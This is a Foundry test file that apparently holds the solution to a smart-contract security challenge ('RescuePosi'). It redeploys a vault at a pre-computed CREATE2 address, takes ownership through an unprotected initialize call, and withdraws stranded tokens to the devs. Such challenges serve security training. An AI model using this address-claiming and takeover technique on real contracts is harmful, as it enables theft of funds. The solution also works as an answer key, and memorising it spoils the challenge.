// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {VaultFactory} from "../src/4_RescuePosi/myVaultFactory.sol";
import {VaultWalletTemplate} from "../src/4_RescuePosi/myVaultWalletTemplate.sol";
import {PosiCoin} from "../src/4_RescuePosi/PosiCoin.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge4Test is Test {
    VaultFactory public FACTORY;
    PosiCoin public POSI;
    address public unclaimedAddress = 0x70E194050d9c9c949b3061CC7cF89dF9c6782b7F;
    address public whitehat = makeAddr("whitehat");
    address public devs = makeAddr("devs");

    function setUp() public {
        vm.label(unclaimedAddress, "Unclaimed Address");

        // Instantiate the Factory
        FACTORY = new VaultFactory();

        // Instantiate the POSICoin
        POSI = new PosiCoin();

        // OOPS transferred to the wrong address!
        POSI.transfer(unclaimedAddress, 1000 ether);
    }


    function testWhitehatRescue() public {
        vm.deal(whitehat, 10 ether);
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge4Test -vvvv //
        ////////////////////////////////////////////////////*/
        
        //we have to deploy one contract with address : 0x70E194050d9c9c949b3061CC7cF89dF9c6782b7F (vault contract address on another chain)
        // eoa: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f (who has deployed above contract)
        bytes memory code = type(VaultWalletTemplate).creationCode;
        address _newVault = FACTORY.deploy(code, uint256(11));
        assertEq(_newVault, unclaimedAddress,"address doesn't match");


        (bool res,) = _newVault.call(abi.encodeWithSignature("initialize(address)", whitehat));
        require(res,"Initialize failed");
        (bool ret,) = _newVault.call(abi.encodeWithSignature("withdrawERC20(address,uint256,address)", address(POSI),1000 ether, devs));
        require(ret,"withdreawERC20 failed");
        
        //==================================================//

        vm.stopPrank();

        assertEq(POSI.balanceOf(devs), 1000 ether, "devs' POSI balance should be 1000 POSI");
    }
}
